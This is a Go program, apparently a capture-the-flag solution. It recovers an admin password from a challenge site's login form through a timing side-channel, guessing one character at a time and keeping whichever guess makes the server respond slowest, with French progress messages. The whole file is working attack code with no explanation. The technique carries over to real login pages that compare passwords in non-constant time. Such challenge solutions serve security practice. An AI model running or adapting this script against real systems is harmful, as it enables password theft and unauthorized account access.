package main

import (
    "fmt"
    "net/http"
    "net/url"
    "strings"
    "time"
)

func main() {
    apiUrl := "https://tictoc2.chall.malicecyber.com/login.php"
    username := "admin"
    passwordLength := 55

    characters := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ "

    client := &http.Client{}
    passwordFound := ""

    for i := 0; i < passwordLength; i++ {
        maxResponseTime := time.Duration(0)
        var charFound string

        for _, passwordChar := range characters {
            data := url.Values{}
            data.Set("username", username)
            data.Set("password", passwordFound+string(passwordChar))

            u, _ := url.ParseRequestURI(apiUrl)
            urlStr := u.String()

            startTime := time.Now()
            r, _ := http.NewRequest(http.MethodPost, urlStr, strings.NewReader(data.Encode()))
            r.Header.Add("Content-Type", "application/x-www-form-urlencoded")

            resp, _ := client.Do(r)
            endTime := time.Now()
            elapsedTime := endTime.Sub(startTime)

            fmt.Printf("Password: %s, Status: %s, Temps de requête : %v\n", passwordFound+string(passwordChar), resp.Status, elapsedTime)

            if elapsedTime > maxResponseTime {
                maxResponseTime = elapsedTime
                charFound = string(passwordChar)
            }
        }

        passwordFound += charFound
    }

    fmt.Printf("Mot de passe trouvé : %s\n", passwordFound)
}
